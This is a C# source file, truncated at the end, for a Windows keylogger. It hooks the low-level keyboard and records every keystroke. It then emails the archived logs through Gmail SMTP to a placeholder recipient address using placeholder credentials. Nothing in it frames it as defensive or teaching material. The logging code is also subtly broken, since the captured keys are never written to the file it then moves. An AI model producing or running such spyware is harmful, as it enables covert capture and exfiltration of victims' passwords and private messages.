using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _sb = new StringBuilder();

        private static string _logFilePath = "log.txt";
        private static long _maxLogSize = 1024 * 1024; // 1 MB

        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);

            try
            {
                Application.Run();
            }
            finally
            {
                UnhookWindowsHookEx(_hookID);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                _sb.Append((Keys)vkCode);

                if (_sb.Length > _maxLogSize)
                {
                    ArchiveLog();
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void ArchiveLog()
        {
            var archivePath = Path.Combine(Path.GetDirectoryName(_logFilePath), "log_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".txt");
            File.Move(_logFilePath, archivePath);
            SendLog(archivePath);
            _sb.Clear();
        }

        private static void SendLog(string filePath)
        {
            try
            {
                var smtpClient = new System.Net.Mail.SmtpClient("smtp.gmail.com", 587);
                smtpClient.EnableSsl = true;
                smtpClient.Credentials = new System.Net.NetworkCredential("youremail@gmail.com", "yourpassword");

                var mailMessage = new System.Net.Mail.MailMessage();
                mailMessage.From = new System.Net.Mail.MailAddress("youremail@gmail.com");
                mailMessage.To.Add("recipientemail@gmail.com");
                mailMessage.Subject = "Keylogger Log";
                mailMessage.Body = "Please find attached the log file.";
                mailMessage.Attachments.Add(new System.Net.Mail.Attachment(filePath));

                smtpClient.Send(mailMessage);
            }
            catch (Exception ex)
            {
                // Handle the exception
            }
        }

        [DllImport("user32.dll", CharSet = CharSet
